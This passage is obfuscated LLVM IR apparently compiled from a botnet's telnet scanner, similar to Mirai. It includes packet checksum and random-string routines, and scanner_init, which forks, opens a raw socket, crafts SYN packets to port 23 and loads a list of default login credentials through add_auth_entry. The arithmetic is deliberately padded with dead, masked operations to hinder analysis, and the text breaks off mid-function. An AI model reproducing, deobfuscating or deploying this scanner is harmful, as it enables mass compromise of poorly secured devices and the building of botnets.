define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %41

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 %30, -113348604
  %32 = add i32 %31, %29
  %33 = add i32 %32, -113348604
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = sub i32 0, 2
  %39 = add i32 %37, %38
  %40 = sub nsw i32 %37, 2
  store i32 %39, i32* %8, align 4
  br label %23

; <label>:41:                                     ; preds = %23
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, 1
  br i1 %43, label %44, label %55

; <label>:44:                                     ; preds = %41
  %45 = load i16*, i16** %9, align 8
  %46 = bitcast i16* %45 to i8*
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = load i32, i32* %12, align 4
  %50 = sub i32 0, %49
  %51 = sub i32 0, %48
  %52 = add i32 %50, %51
  %53 = sub i32 0, %52
  %54 = add i32 %49, %48
  store i32 %53, i32* %12, align 4
  br label %55

; <label>:55:                                     ; preds = %44, %41
  %56 = load i32, i32* %10, align 4
  %57 = lshr i32 %56, 16
  %58 = xor i32 %57, -1
  %59 = xor i32 65535, -1
  %60 = xor i32 -1308287416, -1
  %61 = or i32 %58, %59
  %62 = or i32 -1308287416, %60
  %63 = xor i32 %61, -1
  %64 = and i32 %63, %62
  %65 = and i32 %57, 65535
  %66 = load i32, i32* %12, align 4
  %67 = sub i32 0, %64
  %68 = sub i32 %66, %67
  %69 = add i32 %66, %64
  store i32 %68, i32* %12, align 4
  %70 = load i32, i32* %10, align 4
  %71 = xor i32 %70, -1
  %72 = xor i32 65535, -1
  %73 = xor i32 999100801, -1
  %74 = or i32 %71, %72
  %75 = or i32 999100801, %73
  %76 = xor i32 %74, -1
  %77 = and i32 %76, %75
  %78 = and i32 %70, 65535
  %79 = load i32, i32* %12, align 4
  %80 = sub i32 %79, 99288021
  %81 = add i32 %80, %77
  %82 = add i32 %81, 99288021
  %83 = add i32 %79, %77
  store i32 %82, i32* %12, align 4
  %84 = load i32, i32* %11, align 4
  %85 = lshr i32 %84, 16
  %86 = xor i32 65535, -1
  %87 = xor i32 %85, %86
  %88 = and i32 %87, %85
  %89 = and i32 %85, 65535
  %90 = load i32, i32* %12, align 4
  %91 = sub i32 0, %90
  %92 = sub i32 0, %88
  %93 = add i32 %91, %92
  %94 = sub i32 0, %93
  %95 = add i32 %90, %88
  store i32 %94, i32* %12, align 4
  %96 = load i32, i32* %11, align 4
  %97 = xor i32 65535, -1
  %98 = xor i32 %96, %97
  %99 = and i32 %98, %96
  %100 = and i32 %96, 65535
  %101 = load i32, i32* %12, align 4
  %102 = sub i32 0, %101
  %103 = sub i32 0, %99
  %104 = add i32 %102, %103
  %105 = sub i32 0, %104
  %106 = add i32 %101, %99
  store i32 %105, i32* %12, align 4
  %107 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %108 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %107, i32 0, i32 6
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i16
  %111 = call zeroext i16 @htons(i16 zeroext %110) #7
  %112 = zext i16 %111 to i32
  %113 = load i32, i32* %12, align 4
  %114 = sub i32 0, %113
  %115 = sub i32 0, %112
  %116 = add i32 %114, %115
  %117 = sub i32 0, %116
  %118 = add i32 %113, %112
  store i32 %117, i32* %12, align 4
  %119 = load i16, i16* %7, align 2
  %120 = zext i16 %119 to i32
  %121 = load i32, i32* %12, align 4
  %122 = sub i32 0, %120
  %123 = sub i32 %121, %122
  %124 = add i32 %121, %120
  store i32 %123, i32* %12, align 4
  br label %125

; <label>:125:                                    ; preds = %129, %55
  %126 = load i32, i32* %12, align 4
  %127 = lshr i32 %126, 16
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %141

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* %12, align 4
  %131 = xor i32 65535, -1
  %132 = xor i32 %130, %131
  %133 = and i32 %132, %130
  %134 = and i32 %130, 65535
  %135 = load i32, i32* %12, align 4
  %136 = lshr i32 %135, 16
  %137 = add i32 %133, 589994717
  %138 = add i32 %137, %136
  %139 = sub i32 %138, 589994717
  %140 = add i32 %133, %136
  store i32 %139, i32* %12, align 4
  br label %125

; <label>:141:                                    ; preds = %125
  %142 = load i32, i32* %12, align 4
  %143 = xor i32 %142, -1
  %144 = and i32 443732313, %143
  %145 = xor i32 443732313, -1
  %146 = and i32 %142, %145
  %147 = xor i32 -1, -1
  %148 = and i32 %147, 443732313
  %149 = and i32 -1, %145
  %150 = or i32 %144, %146
  %151 = or i32 %148, %149
  %152 = xor i32 %150, %151
  %153 = xor i32 %142, -1
  %154 = trunc i32 %152 to i16
  ret i16 %154
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 1960073709, %15
  %17 = xor i32 1960073709, -1
  %18 = and i32 %14, %17
  %19 = xor i32 %13, -1
  %20 = and i32 %19, 1960073709
  %21 = and i32 %13, %17
  %22 = or i32 %16, %18
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = xor i32 %14, %13
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 -994099515, %32
  %34 = xor i32 -994099515, -1
  %35 = and i32 %31, %34
  %36 = xor i32 %30, -1
  %37 = and i32 %36, -994099515
  %38 = and i32 %30, %34
  %39 = or i32 %33, %35
  %40 = or i32 %37, %38
  %41 = xor i32 %39, %40
  %42 = xor i32 %31, %30
  store i32 %41, i32* @w, align 4
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @w, align 4
  %45 = xor i32 %44, -1
  %46 = and i32 867930108, %45
  %47 = xor i32 867930108, -1
  %48 = and i32 %44, %47
  %49 = xor i32 %43, -1
  %50 = and i32 %49, 867930108
  %51 = and i32 %43, %47
  %52 = or i32 %46, %48
  %53 = or i32 %50, %51
  %54 = xor i32 %52, %53
  %55 = xor i32 %44, %43
  store i32 %54, i32* @w, align 4
  %56 = load i32, i32* @w, align 4
  ret i32 %56
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %62, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %63

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %24

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = add i64 %18, 8884744354428046478
  %20 = sub i64 %19, 4
  %21 = sub i64 %20, 8884744354428046478
  %22 = sub i64 %18, 4
  %23 = trunc i64 %21 to i32
  store i32 %23, i32* %4, align 4
  br label %62

; <label>:24:                                     ; preds = %8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 2
  br i1 %26, label %27, label %48

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = xor i32 %28, -1
  %30 = xor i32 65535, -1
  %31 = xor i32 1049706818, -1
  %32 = or i32 %29, %30
  %33 = or i32 1049706818, %31
  %34 = xor i32 %32, -1
  %35 = and i32 %34, %33
  %36 = and i32 %28, 65535
  %37 = trunc i32 %35 to i16
  %38 = load i8*, i8** %3, align 8
  %39 = bitcast i8* %38 to i16*
  store i16 %37, i16* %39, align 2
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 2
  store i8* %41, i8** %3, align 8
  %42 = load i32, i32* %4, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, 2
  %45 = add i64 %43, %44
  %46 = sub i64 %43, 2
  %47 = trunc i64 %45 to i32
  store i32 %47, i32* %4, align 4
  br label %61

; <label>:48:                                     ; preds = %24
  %49 = call i32 @rand_next()
  %50 = xor i32 255, -1
  %51 = xor i32 %49, %50
  %52 = and i32 %51, %49
  %53 = and i32 %49, 255
  %54 = trunc i32 %52 to i8
  %55 = load i8*, i8** %3, align 8
  %56 = getelementptr inbounds i8, i8* %55, i32 1
  store i8* %56, i8** %3, align 8
  store i8 %54, i8* %55, align 1
  %57 = load i32, i32* %4, align 4
  %58 = sub i32 0, -1
  %59 = sub i32 %57, %58
  %60 = add nsw i32 %57, -1
  store i32 %59, i32* %4, align 4
  br label %61

; <label>:61:                                     ; preds = %48, %27
  br label %62

; <label>:62:                                     ; preds = %61, %11
  br label %5

; <label>:63:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 28, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %17, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, -1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, -1
  store i32 %14, i32* %4, align 4
  %16 = icmp ne i32 %10, 0
  br i1 %16, label %17, label %27

; <label>:17:                                     ; preds = %9
  %18 = call i32 @rand_next()
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %20 = call i32 @util_strlen(i8* %19)
  %21 = urem i32 %18, %20
  %22 = zext i32 %21 to i64
  %23 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  store i8 %24, i8* %25, align 1
  br label %9

; <label>:27:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.26, align 8
  %6 = alloca %struct.fd_set.26, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.27, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49, %0
  ret void

; <label>:53:                                     ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* null) #6
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 256, i64 296) #6
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

; <label>:59:                                     ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %79

; <label>:62:                                     ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

; <label>:73:                                     ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = sub i32 %74, -818564136
  %76 = add i32 %75, 1
  %77 = add i32 %76, -818564136
  %78 = add nsw i32 %74, 1
  store i32 %77, i32* %1, align 4
  br label %59

; <label>:79:                                     ; preds = %59
  %80 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %80, i32* @rsck, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %79
  br label %83

; <label>:83:                                     ; preds = %82, %79
  %84 = load i32, i32* @rsck, align 4
  %85 = load i32, i32* @rsck, align 4
  %86 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 3, i32 0)
  %87 = and i32 2048, %86
  %88 = xor i32 2048, %86
  %89 = or i32 %87, %88
  %90 = or i32 2048, %86
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 4, i32 %89)
  store i32 1, i32* %1, align 4
  %92 = load i32, i32* @rsck, align 4
  %93 = bitcast i32* %1 to i8*
  %94 = call i32 @setsockopt(i32 %92, i32 0, i32 3, i8* %93, i32 4) #6
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %99

; <label>:96:                                     ; preds = %83
  %97 = load i32, i32* @rsck, align 4
  %98 = call i32 @close(i32 %97)
  br label %99

; <label>:99:                                     ; preds = %96, %83
  br label %100

; <label>:100:                                    ; preds = %107, %99
  %101 = call i32 @rand_next()
  %102 = xor i32 65535, -1
  %103 = xor i32 %101, %102
  %104 = and i32 %103, %101
  %105 = and i32 %101, 65535
  %106 = trunc i32 %104 to i16
  store i16 %106, i16* %2, align 2
  br label %107

; <label>:107:                                    ; preds = %100
  %108 = load i16, i16* %2, align 2
  %109 = call zeroext i16 @ntohs(i16 zeroext %108) #7
  %110 = zext i16 %109 to i32
  %111 = icmp slt i32 %110, 1024
  br i1 %111, label %100, label %112

; <label>:112:                                    ; preds = %107
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.tcphdr*
  store %struct.tcphdr* %115, %struct.tcphdr** %4, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %117 = bitcast %struct.iphdr* %116 to i8*
  %118 = load i8, i8* %117, align 4
  %119 = xor i8 -16, -1
  %120 = xor i8 %118, %119
  %121 = and i8 %120, %118
  %122 = and i8 %118, -16
  %123 = and i8 %121, 5
  %124 = xor i8 %121, 5
  %125 = or i8 %123, %124
  %126 = or i8 %121, 5
  store i8 %125, i8* %117, align 4
  %127 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = load i8, i8* %128, align 4
  %130 = xor i8 15, -1
  %131 = xor i8 %129, %130
  %132 = and i8 %131, %129
  %133 = and i8 %129, 15
  %134 = and i8 %132, 64
  %135 = xor i8 %132, 64
  %136 = or i8 %134, %135
  %137 = or i8 %132, 64
  store i8 %136, i8* %128, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 40) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 2
  store i16 %138, i16* %140, align 2
  %141 = call i32 @rand_next()
  %142 = trunc i32 %141 to i16
  %143 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 3
  store i16 %142, i16* %144, align 4
  %145 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 5
  store i8 64, i8* %146, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 6
  store i8 6, i8* %148, align 1
  %149 = call zeroext i16 @htons(i16 zeroext 23) #7
  %150 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 1
  store i16 %149, i16* %151, align 2
  %152 = load i16, i16* %2, align 2
  %153 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  store i16 %152, i16* %154, align 4
  %155 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 4
  %157 = load i16, i16* %156, align 4
  %158 = xor i16 %157, -1
  %159 = xor i16 -241, -1
  %160 = xor i16 15568, -1
  %161 = or i16 %158, %159
  %162 = or i16 15568, %160
  %163 = xor i16 %161, -1
  %164 = and i16 %163, %162
  %165 = and i16 %157, -241
  %166 = and i16 %164, 80
  %167 = xor i16 %164, 80
  %168 = or i16 %166, %167
  %169 = or i16 %164, 80
  store i16 %168, i16* %156, align 4
  %170 = call i32 @rand_next()
  %171 = xor i32 %170, -1
  %172 = xor i32 65535, -1
  %173 = xor i32 -2125890682, -1
  %174 = or i32 %171, %172
  %175 = or i32 -2125890682, %173
  %176 = xor i32 %174, -1
  %177 = and i32 %176, %175
  %178 = and i32 %170, 65535
  %179 = trunc i32 %177 to i16
  %180 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 5
  store i16 %179, i16* %181, align 2
  %182 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 4
  %184 = load i16, i16* %183, align 4
  %185 = xor i16 %184, -1
  %186 = xor i16 -513, -1
  %187 = xor i16 -14992, -1
  %188 = or i16 %185, %186
  %189 = or i16 -14992, %187
  %190 = xor i16 %188, -1
  %191 = and i16 %190, %189
  %192 = and i16 %184, -513
  %193 = and i16 %191, 512
  %194 = xor i16 %191, 512
  %195 = or i16 %193, %194
  %196 = or i16 %191, 512
  store i16 %195, i16* %183, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i16 zeroext 15)
